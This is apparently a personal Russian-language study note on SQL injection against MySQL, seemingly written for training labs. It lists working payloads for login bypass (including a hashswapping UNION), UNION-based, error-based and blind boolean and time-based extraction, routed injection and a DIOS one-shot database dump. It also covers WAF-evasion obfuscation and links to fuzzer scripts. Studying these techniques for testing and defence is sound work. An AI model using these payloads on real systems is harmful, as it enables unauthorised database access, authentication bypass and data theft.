# $ sqli

Created: December 20, 2024 4:28 PM
Tags: refreshers

# SQL Injections

SQL-инъекции – это внедрение в данные произвольного SQL кода. Если
произвольная SQL команда выполняется, то код уязвим и с базой
данных можно творить все, что в рамках привилегий пользователя, под
которым выполняются запросы.
Самое сложное в SQLi — найти уязвимость в форме ввода, поддающейся SQLi и понять, какие существуют ограничения (фильтрация/WAF/привелегии пользователя)

Прим. — примеры ниже написаны для базы MySQL.

### 1. По типу переменной

### Числовой параметр

**Запрос:**

`SELECT * FROM articles WHERE id = $id`**Ошибка при добавлении кавычки:**

`mysql_query(): You have an error in your SQL syntax...`**Возможные варианты:**

- Кавычки фильтруются
- Вывод ошибок выключен (слепая инъекция)
- Инъекции нет

**Если ошибок нет:**

Можно добавить комментарий (# или другие) к запросу

### Строковой параметр

**Запрос:**

`SELECT * FROM articles WHERE id='1'`**Ошибка при добавлении кавычки:**

`mysql_query(): You have an error in your SQL syntax...`**Если вывод ошибок выключен:**

Использовать `‘1--`

### Авторизация

**Уязвимые поля:** login и pass

**Пример уязвимости в login:**

`SELECT * FROM users WHERE login='admin' AND pass='password'`
Запрос с инъекцией:

`SELECT * FROM users WHERE login='admin' -- ' AND pass='password'`

**Уязвимость в pass:**

`password’ OR login=’admin’ --`

### Обход авторизации техникой hashswapping

```bash
login=admin' UNION SELECT 1 AS id, 'admin' AS login, 'a181b4673216ad247a0f78066a9646e1' AS password FROM users -- -&password=inject
```

### Полезные элементы инъекций

### Оператор AS

**Применение:** Альясинг вложенных запросов и присвоение переменных. Его отсутствие в некоторых моментах может порождать ошибки компиляции (см. пример Blind Time-based), к тому же незаменим, когда нужно “подложить” определенное значение в существующую переменную запроса (см. пример hashswapping)

### Оператор LIKE

**Применение:** Для сравнения строк, бывает полезно в составлении инъекций. ‘%’ - произвольная строка любой длины, ‘_’ - один произвольный символ

**Пример:**

`SELECT * FROM users WHERE login LIKE 'admin' AND password LIKE '%'`

### Затычка для столбцов

Когда мы пишем, к примеру, SELECT database(),2,3 лучше будет писать затычки 2,3 как 22222, 33333 – так будет проще найти где на сайте оказываются результаты запроса (и оказываются ли)

### Комментарии в запросе

**Применение:** Незаменимо, когда нужно “отбросить” часть оригинального SQL-запроса, идущего после места с инъекцией

**Пример:**

`SELECT * FROM users WHERE login = 'admin' -- - AND password = 'secret'` 

| Синтаксис | MySQL | MSSQL | Oracle | Примечания |
| --- | --- | --- | --- | --- |
| -- - | ДА | ДА | ДА | Двойное тире используется для комментирования оставшейся части строки. В MySQL 
этот оператор должен быть сопровожден хотя бы одним пробелом или 
управляющим символом. |
| # | ДА | НЕТ | НЕТ | Символ `#` позволяет комментировать оставшуюся часть строки в MySQL. В отличие от 
двойного тире, после него не обязательно добавлять пробел. |
| /* ***/ | ДА | ДА | ДА | Комментарии в стиле C позволяют использовать встроенные комментарии и многострочные
 комментарии. Они реже используются в SQL-инъекциях, но могут быть 
полезны в редких случаях, как обсуждалось в последнем разделе этой 
статьи. Если комментарий не закрыт, будет вызвана ошибка синтаксиса SQL. |

---

### 2. По типу SQL-инъекций

### Union-based

**Описание:** Наиболее популярный и легкий тип

**Пример инъекции:**

```sql
http://172.23.58.183/?id=1' UNION SELECT 1, database() -- -
```

> **ВАЖНО**!!! Количество столбцов для результата UNION запроса должно **РАВНЯТЬСЯ** количеству столбцов для исходной выборки. Узнать количество столбцов можно
> 

```sql
http://172.23.58.183/?id=1' ORDER BY 2 -- - //нет ошибки
http://172.23.58.183/?id=1' ORDER BY 3 -- - //есть ошибка, значит столбцов 2
```

### Error-based

**Описание:** Использует ошибки для получения данных

```sql
http://172.23.58.183/?id=1' SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY MID(VERSION(), FLOOR(RAND(33)*2), 64)

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY MID(VERSION(), FLOOR(RA' at line 1
```

### Blind Boolean-based

**Описание:** Нет возможности вывести данные, ошибок также нет

**Метод:** Получение информации через true/false запросы

```sql
http://172.23.58.183/?id=1' and ASCII(SUBSTRING((SELECT user()),1,1))>97 -- - //вопрос "правда ли, что первый символ имени пользователя имеет код больше 97 в ASCII?", истина - страница прорисуется

http://172.23.58.183/?id=1' and ASCII(SUBSTRING((SELECT user()),1,1))<97 -- - //вопрос "правда ли, что первый символ имени пользователя имеет код меньше 97 в ASCII?", ложь - страница не прорисуется (или пропадет прежний результат выборки запроса, главное что есть отличие от предыдущего) 
```

> Слепые инъекции трудоемки в эксплуатации, крайне рекомендуется автоматизировать (самописными скриптами или sqlmap)
> 

### Blind Time-based

**Описание:** Сложный тип инъекции, когда совсем нет возможности увидеть результат инъекции

**Метод:** Использует временные задержки для определения наличия инъекции

```sql
http://172.23.58.183/?id=1' and (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 0,1), 1, 1))>97 THEN SLEEP(3) END) -- - //спит 3 секунды, если первый символ имени пользователя имеет код больше 97 в ASCII
```

### Посимвольная слепая разведка на основе времени (1)

```bash
name=test' AND (SELECT 1 FROM (SELECT(IF(ASCII(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1), 1, 1))=§§, SLEEP(3), 0))) AS injectalias) AND '1'='1
```

### Верификация результатов разведки

```bash
name=test' AND (SELECT 1 FROM (SELECT(IF((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1)='users', SLEEP(5), 0))) AS injectalias) AND '1'='1
```

### Посимвольная слепая разведка на основе времени (2)

```bash
name=test' AND (SELECT 1 FROM (SELECT(IF(ASCII(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 0, 1), 1, 1))=§§, SLEEP(3), 0))) AS injectalias) AND '1'='1
```

### Посимвольная слепая разведка на основе времени (3)

```sql
' and (case when ASCII(substring((SELECT database() limit 0,1), {}, {}))={} THEN sleep(3) END) -- -
```

### Routed SQL Injection

### Определение

Routed SQL Injection, или маршрутизируемая SQL-инъекция, представляет собой 
ситуацию, когда SQL-инъекция не дает немедленного результата, но 
указывает на место для другой инъекции, которая может привести к 
результату. Иными словами, это инъекция внутри инъекции, актуальная в случае, когда существует вложенный запрос.

### Пример

Предположим, на сайте есть уязвимость по адресу:
`http://example.com/index.php?id=1`
Для обнаружения колонки, которая может быть уязвимой, последовательно подставляем строки вида: `"n'"`где `n` — номер колонки. В результате должно появиться сообщение об ошибке синтаксиса, указывающее на уязвимость в определенной колонке.

```sql
http://example.com/index.php?id=1' UNION SELECT 1, 2, 3 -- //результата нет
http://example.com/index.php?id=1' union select 1,"2'",3 -- //обнаружили ошибку на месте столбца 2 - маршрутизируемая инъекция
http://example.com/index.php?id=1' union select 1,"2' union select 1,2,3,4",3 -- //успешная маршрутизируемая инъекция
```

### DIOS (Dump In One Shot)

DIOS - эффективная техника формирования дампа базы всего за один запрос.

```sql
http://172.23.58.183/?id=1' UNION
SELECT 1,
       (
       (
              SELECT (@a)
              FROM   (
                            SELECT(@a:=0x00),
                                   (
                                          SELECT (@a)
                                          FROM   (information_schema.columns)
                                          WHERE  (
                                                        @a)IN (@a:=concat(@a,'',table_schema,' >>> ',table_name,'<br>',''))))a)) -- -

```

### Обфускация запросов

Обфускация SQL-запросов — это метод, используемый для маскировки или изменения структуры SQL-запросов, чтобы обойти механизмы защиты, такие как WAF (Web Application Firewall) или другие фильтры, которые могут блокировать определенные символы и 
конструкции.

### Зачем нужна обфускация?

Обфускация необходима в случае, если:

- Существуют ограничения на использование определенных символов (например, кавычек или пробелов).
- Необходимо скрыть истинные намерения атакующего.
- Защитные меры на сервере активны и фильтруют подозрительные запросы.

### Методы обфускации

1. **Замена символов на Unicode или Hex:**
    
    Заменяя специальные символы на их представление в Unicode или hex, можно обойти простые фильтры.
    
    - Пример:
    `"1' OR '1'='1" -> "0x223127204f52202731273d273127"`
2. **Использование комментариев:**
    
    Добавление SQL-комментариев в запрос обфусцирует его.
    
    - Пример:
    `"1' UNION SELECT 1, 2 --" может быть записано как "1' UNION SELECT 1 /* comment */, 2 --"`
3. **Разделение строк:**
    
    Разделяя строки на несколько частей, можно скрыть структуру запроса.
    
    - Пример:
    `"1' UNION SELECT " + "1" + ", 2 --"`
4. **Использование функций:**
    
    Использование встроенных функций для получения значений.
    
    - Пример:
    `"1' UNION SELECT CONCAT('Data', '1'), 2 --"`
5. **Перестановка частей запроса:**
    
    Изменение порядка условий или группировка их с помощью подзапросов.
    
    - Пример:
    `"1' UNION SELECT (SELECT column_name FROM information_schema.columns WHERE table_name='users'), 2 --"`

### Примеры обфускации

1. **Прямое использование hex-кодов**
`SELECT * FROM users WHERE username = 0x61646d696e;`
2. **Обфускация с помощью комментариев:**
`SELECT * FROM users WHERE id = 1 /* AND */ OR 1=1;`
3. **Комбинация методов:**
`SELECT * FROM users WHERE username = 'admin' AND password = 'password' --'`
можно обфусцировать как:
`SELECT * FROM users WHERE username = 'admin' /* AND */ AND password = 'pass' || 'word' --'`

> Больше про SQLi, DIOS, Filter and WAF evasion, специфике работы определенных СУБД можно прочитать в прикрепленных методичках
> 

---

[6.1.1.SQL-инъекции.pdf]($%20sqli/6.1.1.SQL-%25D0%25B8%25D0%25BD%25D1%258A%25D0%25B5%25D0%25BA%25D1%2586%25D0%25B8%25D0%25B8.pdf)

[6.1.2.SQL-инъекции.pdf]($%20sqli/6.1.2.SQL-%25D0%25B8%25D0%25BD%25D1%258A%25D0%25B5%25D0%25BA%25D1%2586%25D0%25B8%25D0%25B8.pdf)

[6.1.3.SQL-инъекции (Cheat sheet ).pdf]($%20sqli/6.1.3.SQL-%25D0%25B8%25D0%25BD%25D1%258A%25D0%25B5%25D0%25BA%25D1%2586%25D0%25B8%25D0%25B8_(Cheat_sheet_).pdf)

[codebysqlitask3curlfuzzer.py]($%20sqli/codebysqlitask3curlfuzzer.py)

[codebysqlitask4curlfuzzer.py]($%20sqli/codebysqlitask4curlfuzzer.py)

[codebysqlitask5curlfuzzer.py]($%20sqli/codebysqlitask5curlfuzzer.py)

1. [О языке sql](https://www.w3schools.com/sql/)
2. [Справочник по SQL-injection](http://www.sqlinjection.net/)
3. [Туториалs по sql-injection](http://www.securityidiots.com/Web-Pentest/SQL-Injection)
4. [Еще по sql](https://sqlwiki.netspi.com/#mysql)